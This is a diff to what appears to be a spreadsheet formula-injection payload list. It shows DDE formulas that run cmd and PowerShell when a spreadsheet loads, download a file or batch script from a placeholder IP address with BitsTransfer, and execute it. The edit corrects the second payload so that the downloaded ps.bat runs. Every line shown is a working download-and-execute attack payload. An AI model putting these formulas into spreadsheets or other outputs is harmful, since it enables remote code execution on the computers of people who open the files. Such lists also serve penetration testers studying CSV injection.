@@ -38,4 +38,4 @@ Execute content when the spreadsheet loads
 ------------------------------------------------
 # Works with any payload, will open associated extension or run exe, bat, etc....
 =cmd|'/C powershell Import-Module BitsTransfer;Start-BitsTransfer -source http://xxx.xxx.xxx.xxx/index.jpeg;Start-Process index.jpeg'!A0
-=cmd|'/C powershell Import-Module BitsTransfer;Start-BitsTransfer -source http://xxx.xxx.xxx.xxx/ps.bat;Start-Process index.ps.bat'!A0
+=cmd|'/C powershell Import-Module BitsTransfer;Start-BitsTransfer -source http://xxx.xxx.xxx.xxx/ps.bat;Start-Process ps.bat'!A0
